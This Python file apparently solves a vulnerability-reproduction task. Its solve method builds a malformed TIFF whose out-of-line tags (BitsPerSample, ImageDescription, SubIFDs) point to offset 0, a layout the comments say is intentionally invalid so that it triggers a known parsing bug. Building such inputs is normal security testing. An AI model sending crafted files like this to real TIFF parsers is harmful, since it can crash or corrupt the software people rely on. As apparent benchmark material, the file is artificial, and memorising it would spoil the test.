import struct
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Classic little-endian TIFF with an out-of-line (offline) tag using value_offset=0.
        # This is intentionally invalid per the vulnerability description.
        #
        # Layout:
        # [0..7]   TIFF header
        # [8..]    IFD
        # [..]     Image data (dummy)

        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack("<HHII", tag & 0xFFFF, typ & 0xFFFF, count & 0xFFFFFFFF, value_or_offset & 0xFFFFFFFF)

        # TIFF types
        TYPE_BYTE = 1
        TYPE_ASCII = 2
        TYPE_SHORT = 3
        TYPE_LONG = 4

        # Tags
        TAG_ImageWidth = 256
        TAG_ImageLength = 257
        TAG_BitsPerSample = 258
        TAG_Compression = 259
        TAG_PhotometricInterpretation = 262
        TAG_ImageDescription = 270
        TAG_StripOffsets = 273
        TAG_SamplesPerPixel = 277
        TAG_RowsPerStrip = 278
        TAG_StripByteCounts = 279
        TAG_SubIFDs = 330

        # IFD entries (sorted by tag)
        # BitsPerSample is offline because count=3, type=SHORT => 6 bytes; offset set to 0 (invalid).
        # ImageDescription is offline because count=5, type=ASCII => 5 bytes; offset set to 0 (invalid).
        # SubIFDs is offline because count=2, type=LONG => 8 bytes; offset set to 0 (invalid).
        entries: List[Tuple[int, int, int, int]] = []

        width = 1
        height = 1
        samples_per_pixel = 3
        strip_byte_counts = 3  # 1x1 RGB, 8bpc => 3 bytes

        entries.append((TAG_ImageWidth, TYPE_LONG, 1, width))
        entries.append((TAG_ImageLength, TYPE_LONG, 1, height))
        entries.append((TAG_BitsPerSample, TYPE_SHORT, 3, 0))  # invalid offline offset
        entries.append((TAG_Compression, TYPE_SHORT, 1, 1))  # none; stored in low 16 bits
        entries.append((TAG_PhotometricInterpretation, TYPE_SHORT, 1, 2))  # RGB
        entries.append((TAG_ImageDescription, TYPE_ASCII, 5, 0))  # invalid offline offset
        # StripOffsets to image data placed after IFD; computed below
        # SamplesPerPixel
        entries.append((TAG_SamplesPerPixel, TYPE_SHORT, 1, samples_per_pixel))
        entries.append((TAG_RowsPerStrip, TYPE_LONG, 1, height))
        entries.append((TAG_StripByteCounts, TYPE_LONG, 1, strip_byte_counts))
        entries.append((TAG_SubIFDs, TYPE_LONG, 2, 0))  # invalid offline offset

        entries.sort(key=lambda x: x[0])

        num_entries = len(entries)
        ifd_len = 2 + 12 * num_entries + 4
        image_data_offset = 8 + ifd_len

        # Build IFD
        ifd = bytearray()
        ifd += struct.pack("<H", num_entries)
        for tag, typ, count, val in entries:
            if tag == TAG_StripOffsets:
                pass
            if tag == TAG_Compression or tag == TAG_PhotometricInterpretation or tag == TAG_SamplesPerPixel:
                # SHORT stored in 4-byte field; low 16 bits hold the value
                val = val & 0xFFFF
            if tag == TAG_StripOffsets:
                val = image_data_offset
            ifd += ifd_entry(tag, typ, count, val)
        ifd += struct.pack("<I", 0)  # next IFD offset

        # Insert StripOffsets entry with correct offset (after computing IFD length)
        # (We didn't add it above to avoid computing its offset late; add now and rebuild cleanly.)
        entries2: List[Tuple[int, int, int, int]] = []
        entries2.append((TAG_ImageWidth, TYPE_LONG, 1, width))
        entries2.append((TAG_ImageLength, TYPE_LONG, 1, height))
        entries2.append((TAG_BitsPerSample, TYPE_SHORT, 3, 0))
        entries2.append((TAG_Compression, TYPE_SHORT, 1, 1))
        entries2.append((TAG_PhotometricInterpretation, TYPE_SHORT, 1, 2))
        entries2.append((TAG_ImageDescription, TYPE_ASCII, 5, 0))
        entries2.append((TAG_StripOffsets, TYPE_LONG, 1, image_data_offset))
        entries2.append((TAG_SamplesPerPixel, TYPE_SHORT, 1, samples_per_pixel))
        entries2.append((TAG_RowsPerStrip, TYPE_LONG, 1, height))
        entries2.append((TAG_StripByteCounts, TYPE_LONG, 1, strip_byte_counts))
        entries2.append((TAG_SubIFDs, TYPE_LONG, 2, 0))
        entries2.sort(key=lambda x: x[0])

        num_entries = len(entries2)
        ifd_len = 2 + 12 * num_entries + 4
        image_data_offset = 8 + ifd_len

        # Update strip offset (depends on IFD length)
        entries3: List[Tuple[int, int, int, int]] = []
        for tag, typ, count, val in entries2:
            if tag == TAG_StripOffsets:
                val = image_data_offset
            entries3.append((tag, typ, count, val))

        ifd = bytearray()
        ifd += struct.pack("<H", num_entries)
        for tag, typ, count, val in entries3:
            if tag in (TAG_Compression, TAG_PhotometricInterpretation, TAG_SamplesPerPixel):
                val = val & 0xFFFF
            ifd += ifd_entry(tag, typ, count, val)
        ifd += struct.pack("<I", 0)

        header = struct.pack("<2sHI", b"II", 42, 8)

        image_data = b"\x00\x00\x00"
        pad_len = (image_data_offset - (len(header) + len(ifd)))
        if pad_len < 0:
            pad_len = 0
        padding = b"\x00" * pad_len

        return bytes(header + ifd + padding + image_data)